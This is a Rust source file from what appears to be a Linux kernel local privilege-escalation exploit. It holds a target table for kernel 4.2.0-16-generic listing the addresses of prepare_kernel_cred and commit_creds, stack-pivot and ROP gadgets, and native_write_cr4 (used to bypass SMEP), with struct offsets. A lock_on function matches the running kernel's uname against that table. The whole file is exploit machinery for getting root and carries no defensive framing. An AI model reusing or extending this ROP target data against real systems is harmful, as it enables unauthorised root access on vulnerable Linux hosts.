extern crate libc;
use libc::{uname, utsname};
use std::ffi::CStr;

#[derive(Debug)]
pub struct Target {
    pub kernel_version: Option<&'static str>,
    pub prepare_kernel_cred: u64,
    pub commit_creds: u64,
    pub rax_ptr: u64,
    pub pivot: u64,
    pub poprdiret: u64,
    pub native_write_cr4: u64,
    pub mov_rdi_rax: u64,
    pub rax_off: usize,
    pub rip_off: usize,
    pub pivot_off: usize,
    pub commit_off: usize,
}

pub static TARGETS: &[Target] = &[
    Target {
        kernel_version: Some("4.2.0-16-generic"),
        prepare_kernel_cred: 0xffffffff8109c720,
        commit_creds: 0xffffffff8109c420,
        rax_ptr: 0xffffffffc0379670,
        pivot: 0xffffffff812c2547,
        poprdiret: 0xffffffff813d3cdf,
        native_write_cr4: 0xffffffff810604a0,
        mov_rdi_rax: 0xffffffff8131e4fe,
        rax_off: 0x30,
        rip_off: 0x98,
        pivot_off: 0x28, 
        commit_off: 0x18,
    }
];

pub fn lock_on() -> Result<&'static Target, String> {
    let mut name: utsname = unsafe { std::mem::zeroed() };

    if unsafe { uname(&mut name) } != 0 {
        return Err("[-] Failed to get system uname".into());
    }

    let release = unsafe { CStr::from_ptr(name.release.as_ptr()).to_str().unwrap() };
    println!("[+] System release: {}", release);

    for target in TARGETS {
        if let Some(kernel_version) = target.kernel_version {
            if kernel_version == release {
                println!("[+] Found kernel target.");
                return Ok(target);
            }
        }
    }
    
    return Err("[-] No offsets for this kernel.".into());
}
